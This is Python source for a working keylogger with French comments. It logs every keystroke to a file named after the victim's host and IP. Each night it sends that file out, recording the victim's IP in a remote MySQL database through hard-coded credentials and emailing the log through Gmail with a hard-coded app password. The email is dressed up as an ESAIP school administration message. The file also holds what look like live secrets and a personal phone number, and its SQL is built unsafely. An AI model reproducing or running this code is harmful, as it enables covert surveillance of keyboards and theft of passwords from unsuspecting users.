import os
import time
import datetime
import string
import socket
import threading
import mysql.connector
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from pynput.keyboard import Key, Listener
from getmac import get_mac_address

last_key_time = time.time()
last_line_time = time.time()

# Chemin du dossier Téléchargements
downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')

def get_system_info_ext():
    # Nom d'hôte
    host_name = socket.gethostname()
    # Adresse IP
    ip_address = socket.gethostbyname(host_name)
    # Adresse MAC
    mac_address = get_mac_address()
    # Affichage des résultats
    computer_data = [host_name, ip_address, mac_address]
    return computer_data


def on_press(key):
    global last_key_time, last_line_time
    current_time = time.strftime("%H:%M:%S", time.localtime())

    # Chemin complet du fichier dans Téléchargements
    file_path = os.path.join(downloads_path, file_name)

    with open(file_path, "a") as f:
        if time.time() - last_key_time >= 5:
            f.write(f"\n{current_time} : {str(key).strip('\'')}")
            last_line_time = time.time()
        else:
            f.write(f"{str(key).strip('\'')}")
        last_key_time = time.time()


def on_release(key):
    pass


def connect_to_database():
    try:
        conn = mysql.connector.connect(
            host="46.105.155.130",
            port=3306,
            user="u1133_XDDiX8qxHl",
            password="WQ6A=fKw4Rsvf!poL2FM36fG",
            database="s1133_AdminPanel"
        )
        return conn
    except mysql.connector.Error as err:
        print("Error:", err)
        return None


def send_keylogger_mail():
    # Chemin complet du fichier dans Téléchargements
    file_path = os.path.join(downloads_path, file_name)

    # Paramètres du compte Gmail
    email = 'esaipbachelor@gmail.com'
    password = 'rurg urmn piee zllf'

    nom_expéditeur = "Esaip Admin"
    nom_signature = "Directeur Jerry"

    # Destinataire et contenu de l'e-mail
    objet = "B1 EXPORT ABSENCES AU 22/03/2024"
    mail = f"""
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>☠️ Admin Panel ☠️ | Account Vérification</title>
        <style>
        #custom_mail {{
            margin: 0;
            padding: 0;
            text-align: center;
            color: black;
            font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
        }}
        #titre {{
            color: #000;
        }}
        .p:visited,
        .p {{
            color: black;
        }}
        #custom_mail #titre {{
            font-weight: bold;
        }}
        #custom_mail .list_item {{
            list-style: none;
        }}
        #custom_mail #signature {{
            display: flex;
            width: fit-content;
            flex-direction: row;
            align-items: center;
            font-size: 10px;
            margin-top: 40px;
            text-align: left;
        }}
        #custom_mail #signature #image_sign {{
            width: calc(190px*1.5);
            height: calc(94px*1.5);
        }}
        #custom_mail #signature #un_list {{
            background-color: #00A0E3;
            font-weight: bold;
            color: #fff;
            padding: 10px;
        }}
        #custom_mail #signature #un_list #last_li {{
            font-size: 8px;
            font-style: oblique;
            font-variant: small-caps;
            text-decoration: underline;
        }}
        #verif_code {{
            color: black;
            font-weight: bold;
            padding: 15px;
            background-color: #00A0E3;
            border-radius: 7px;
            transition: 0.2s;
        }}
        #verif_code:hover {{
            background-color: #16b9ff;
            cursor: pointer;
            transition: 0.2s;
        }}
        </style>
    </head>
    <body id="custom_mail">
        <main>
            <h1 id="titre">Account Vérification</h1>
            <section class="mail_preset">
            </section>
            <section id="signature">
                <img id="image_sign" src="cid:signature_image" alt="ESAIP Signature">
                <ul id="un_list">
                    <li class="list_item">
                        <p>ESAIP Bachelor</p>
                    </li>
                    <li class="list_item">
                        <p>Etudiant en Première année</p>
                    </li>
                    <li class="list_item">
                        <p>Cycle Bachelor Cyber-Sécurité</p>
                    </li>
                    <li class="list_item">
                        <p>06 60 32 21 08</p>
                    </li>
                    <li class="list_item">
                        <p>Campus Ouest</p>
                    </li>
                    <li class="list_item" id="last_li">
                        <p>18, rue du 8 mai 1945 - CS 80022 - 49180 St-Barthélemy d'Anjou Cedex</p>
                    </li>
                </ul>
            </section>
        </main>
    </body>
    <script>
        const span = document.querySelector("span");
        const copying = document.getElementById("copying");
        span.onclick = function() {{
        document.execCommand("copy");
        copying.textContent = "Copied";
        }}
        span.addEventListener("copy", function(event) {{
        event.preventDefault();
        if (event.clipboardData) {{
            event.clipboardData.setData("text/plain", span.textContent);
            console.log(event.clipboardData.getData("text"))
        }}
        copying.textContent = "Copied";
        }});
    </script>
    </html>
    """
    # Création du message
    msg = MIMEMultipart()
    msg['From'] = f"{nom_expéditeur} <{email}>"
    msg['To'] = email
    msg['Subject'] = objet

    # Ajout du contenu du message
    msg.attach(MIMEText(mail, 'html'))

    # Ajout de la pièce jointe
    with open(file_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {file_path}')

    msg.attach(part)

    # Connexion au serveur SMTP de Gmail
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)

    # Envoi de l'e-mail
    texte = msg.as_string()
    server.sendmail(email, email, texte)

    # Fermeture de la connexion au serveur SMTP
    server.quit()


def close_connection(conn):
    if conn:
        conn.close()


def data_send_to_db(ip, file_name):
    conn = connect_to_database()
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute(f'INSERT INTO keylogger_files (`ip`, `filename`) VALUES ("{ip}", "{file_name}")')
            conn.commit()
            cursor.close()

        finally:
            close_connection(conn)


def check_time_and_send():
    current_time = time.strftime("%H:%M:%S", time.localtime())
    if current_time == "23:59:59":
        data_send_to_db(get_system_info_ext()[1], file_name)
        send_keylogger_mail()  # Appel de la fonction pour envoyer l'e-mail avec le fichier joint
    else:
        pass
    # Attendre 1 seconde avant de vérifier à nouveau
    time.sleep(1)


def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


current_date = datetime.datetime.now()
file_name = f"{get_system_info_ext()[0]}-{get_system_info_ext()[1]}-{current_date.strftime('%Y-%m-%d')}.txt"

# Créer un thread pour l'écoute des touches
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

# Boucle pour vérifier l'heure à intervalles réguliers
while True:
    check_time_and_send()